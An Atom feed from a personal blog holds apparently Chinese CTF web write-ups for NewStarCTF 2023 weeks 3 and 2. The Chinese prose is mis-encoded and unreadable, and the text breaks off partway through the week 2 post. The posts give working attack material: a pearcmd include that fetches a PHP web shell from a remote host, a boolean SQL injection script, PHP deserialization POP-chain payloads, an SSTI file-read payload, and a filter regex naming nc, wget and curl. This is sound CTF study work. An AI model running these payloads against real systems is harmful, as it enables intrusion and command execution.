<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lazy_forever&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/3be84ef44da20b5b934b6b90898b49e3</icon>
  
  <link href="https://blog.lazyforever.top/atom.xml" rel="self"/>
  
  <link href="https://blog.lazyforever.top/"/>
  <updated>2023-10-22T13:57:05.312Z</updated>
  <id>https://blog.lazyforever.top/</id>
  
  <author>
    <name>lazy_forever</name>
    <email>2606090126@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NewStarCTF 2023-WEEK3 Web WriteUp</title>
    <link href="https://blog.lazyforever.top/2023/10/17/2023newstarctfWeek3/"/>
    <id>https://blog.lazyforever.top/2023/10/17/2023newstarctfWeek3/</id>
    <published>2023-10-17T04:55:06.000Z</published>
    <updated>2023-10-22T13:57:05.312Z</updated>
    
    <content type="html"><![CDATA[<p>è§£é¢˜ 5&#x2F;6</p><h2 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h2><p>æ‰“å¼€å®¹å™¨ï¼Œæç¤ºphpinfo</p><p>è¿›å…¥phpinfo.phpæŸ¥çœ‹phpé…ç½®ï¼Œå‘ç°register_argc_argvé…ç½®è¢«æ‰“å¼€ï¼Œindex.phpå†…éƒ¨æœ‰ä¸€ä¸ªåç¼€åä¸º.phpçš„æ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡pearcmdæ¥åŒ…å«è¿›è¡Œæ¶æ„æ–‡ä»¶çš„ä¸‹è½½ï¼Œåœ¨vpsä¸Šæ„é€ æ¶æ„æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php system($_GET[0]);&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨pearcmdåŒ…å«ï¼š<code>?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</code></p><p>è¿›å…¥tmp&#x2F;pear&#x2F;download&#x2F;evil.phpç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯ã€‚</p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>è·ŸWeek2å·®ä¸å¤šï¼Œä½†æ˜¯æŠŠunionçš„å¤§å°å†™ç¦ç”¨äº†ï¼Œç”¨ä¸äº†è”åˆæ³¨å…¥ï¼Œä½¿ç”¨å¸ƒå°”æ³¨å…¥</p><p>è´´ä¸ªå¸ƒå°”æ³¨å…¥è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://4bbc4bf0-4b86-4dc7-90db-8609acab2c76.node4.buuoj.cn:81/?id=TMP0919\&#x27;And if(suBstring((seLect flag from ctf.here_is_flag liMit%201),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)--+&#x27;</span></span><br><span class="line"></span><br><span class="line">all_chars = string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span>+<span class="string">&quot;&#123;&quot;</span>+<span class="string">&quot;&#125;&quot;</span>+<span class="string">&quot;-&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_chars:</span><br><span class="line">        ppp=url.<span class="built_in">format</span>(i, j)</span><br><span class="line">        re=requests.get(ppp)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(re.text)&gt;<span class="number">450</span>:</span><br><span class="line">            <span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>, flag)</span><br></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>æ‰“å¼€å®¹å™¨ï¼Œæ˜¯phpååºåˆ—åŒ–</p><p>POPé“¾ï¼š<code>Begin-&gt;name-&gt;__destruct()-&gt;Then-&gt;func-&gt;__toString()-&gt;Super-&gt;obj-&gt;invoke()-&gt;Handle-&gt;obj-&gt;__call-&gt;CTF-&gt;handle-&gt;end()-&gt;WhiteGod-&gt;__unset()</code></p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>, <span class="variable">$this</span>-&gt;name)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">Super</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> CTF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>æ‰“å¼€å®¹å™¨åå‘ç°è¿”å›è¡¨å¤´popå€¼ä¸º&#x2F;secr3tofpop</p><p>è¿›å…¥åå‘ç°æ˜¯python flaskçš„ssti</p><p>é»‘åå•æœ‰<code>&#123;&#123;&#125;&#125;</code>ï¼Œ<code>os</code>ï¼Œ<code>=</code>ç­‰</p><p><code>name=&#123;%print(&#123;&#125;.__class__.__bases__[0].__subclasses__())%&#125;</code>æŸ¥çœ‹æ‰€æœ‰æ–¹æ³•</p><p>ä½¿ç”¨FileLoader</p><p><code>?name=&#123;%print(&#123;&#125;.__class__.__bases__[0].__subclasses__()[99][%22get_data%22](0,%22flag%22))%&#125;</code></p><p>å¾—åˆ°flag</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤çš„å­—ç¬¦æœ‰ç‚¹å¤šï¼Œä¸å¤ªå®¹æ˜“RCEï¼Œæœ€åç”¨äº†ä¸ªå°æŠ€å·§ï¼ŒæŠŠindex.phpä¸­çš„<code>|</code>åˆ å»ï¼Œç„¶åå†å‘½ä»¤æ‰§è¡Œã€‚</p><p>ç»™å‡ºpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="string">&#x27;sed -i \&#x27;s/|//g\&#x27; index`echo -e &quot;\x2ep&quot;`hp&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="string">&#x27;ls / &gt;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="string">&#x27;cat /flag_is_h3eeere &gt;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>ä¸ä¼šï¼Œç­‰ä¸ªå®˜æ–¹wpï¼Œä½†å‡­æ„Ÿè§‰æ˜¯åŸå‹é“¾æ±¡æŸ“</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¬¬ä¸‰å‘¨æ„Ÿè§‰éš¾åº¦ä¸Šæ¥äº†ï¼Œåšèµ·æ¥æœ‰ç‚¹è´¹åŠ²äº†</p><p>è´´ä¸ªå®˜æ–¹wpï¼š<a href="https://shimo.im/docs/QPMRxzGktzsZnzhz">https://shimo.im/docs/QPMRxzGktzsZnzhz</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è§£é¢˜ 5&amp;#x2F;6&lt;/p&gt;
&lt;h2 id=&quot;Include-ğŸ&quot;&gt;&lt;a href=&quot;#Include-ğŸ&quot; class=&quot;headerlink&quot; title=&quot;Include ğŸ&quot;&gt;&lt;/a&gt;Include ğŸ&lt;/h2&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨ï¼Œæç¤ºphpinfo&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://blog.lazyforever.top/categories/WriteUp/"/>
    
    
    <category term="web" scheme="https://blog.lazyforever.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>NewStarCTF 2023-WEEK2 Web WriteUp</title>
    <link href="https://blog.lazyforever.top/2023/10/10/2023newstarctfWeek2/"/>
    <id>https://blog.lazyforever.top/2023/10/10/2023newstarctfWeek2/</id>
    <published>2023-10-09T23:51:20.000Z</published>
    <updated>2023-10-18T08:48:17.042Z</updated>
    
    <content type="html"><![CDATA[<p>è§£é¢˜ 6&#x2F;6</p><h2 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h2><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼ŒF12è¿›è¡Œjavascriptä»£ç å®¡è®¡ã€‚</p><p>å‘ç°å‡½æ•°gameover()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gameover</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(gameScore &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/api.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> response = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">            <span class="title function_">alert</span>(response.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="attr">score</span>: gameScore,</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;æˆç»©ï¼š&quot;</span>+gameScore);</span><br><span class="line">gameScore=<span class="number">0</span>;  </span><br><span class="line">curPhase =<span class="variable constant_">PHASE_READY</span>;  </span><br><span class="line">hero = <span class="literal">null</span>;</span><br><span class="line">hero = <span class="keyword">new</span> <span class="title class_">Hero</span>();      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æé€»è¾‘ï¼Œå‘ç°å½“<code>gameScore</code>å¤§äº100000æ—¶ï¼Œä¼šå°†<code>&#123;score: gameScore&#125;</code>è½¬åŒ–ä¸ºjsonå‘é€åˆ°&#x2F;api.phpï¼Œå°†è¿”å›ç»“æœ<code>alert</code>ï¼Œå› æ­¤çŒœæµ‹flagç”±api.phpç»™å‡ºã€‚</p><p>åœ¨æ§åˆ¶å°é‡å†™gameoverå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gameover</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(gameScore &lt; <span class="number">100000</span>)&#123;</span><br><span class="line">        gameScore = <span class="number">1000000</span>;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/api.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> response = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">            <span class="title function_">alert</span>(response.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="attr">score</span>: gameScore,</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;æˆç»©ï¼š&quot;</span>+gameScore);</span><br><span class="line">gameScore=<span class="number">0</span>;  </span><br><span class="line">curPhase =<span class="variable constant_">PHASE_READY</span>;  </span><br><span class="line">hero = <span class="literal">null</span>;</span><br><span class="line">hero = <span class="keyword">new</span> <span class="title class_">Hero</span>();      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨æ§åˆ¶å°æ‰§è¡Œgameover()ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;5d66c0a8-cb52-4099-a3fb-f7d5cf4826d0&#125;</code></p><h2 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h2><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€æ®µphp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span 